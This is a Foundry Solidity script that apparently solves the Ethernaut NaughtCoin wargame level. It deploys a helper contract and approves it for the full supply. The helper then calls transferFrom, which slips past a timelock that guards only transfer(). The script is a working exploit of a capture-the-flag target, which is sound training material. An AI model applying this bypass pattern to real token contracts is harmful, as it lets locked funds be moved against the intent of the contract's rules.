// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/NaughtCoin.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract ApprovalContract {
    function transferTokensFromPlayer(NaughtCoin token) external {
        token.transferFrom(
            token.player(),
            address(this),
            token.INITIAL_SUPPLY()
        );
    }
}

contract NaughtCoinSolution is Script {
    NaughtCoin constant naughtCoinInstance =
        NaughtCoin(0x29c198ca448035d0E9E2ACC96efc970630CA109d);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        ApprovalContract approvalContract = new ApprovalContract();
        naughtCoinInstance.approve(
            address(approvalContract),
            naughtCoinInstance.INITIAL_SUPPLY()
        );

        approvalContract.transferTokensFromPlayer(naughtCoinInstance);

        vm.stopBroadcast();
    }
}
